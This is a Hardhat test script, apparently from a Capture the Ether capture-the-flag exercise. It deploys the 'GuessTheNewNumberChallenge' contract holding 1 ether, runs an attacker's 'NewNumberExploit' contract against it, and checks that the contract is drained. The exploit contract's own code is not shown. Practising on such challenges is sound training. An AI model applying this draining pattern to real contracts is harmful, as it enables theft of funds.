import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);
  });

  it('exploit', async () => {
    const exploit = await (
      await ethers.getContractFactory('NewNumberExploit', attacker)
    ).deploy(target.address);
    await exploit.deployed();

    const tx = await exploit.attack({ value: utils.parseEther('1') });
    await tx.wait();

    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
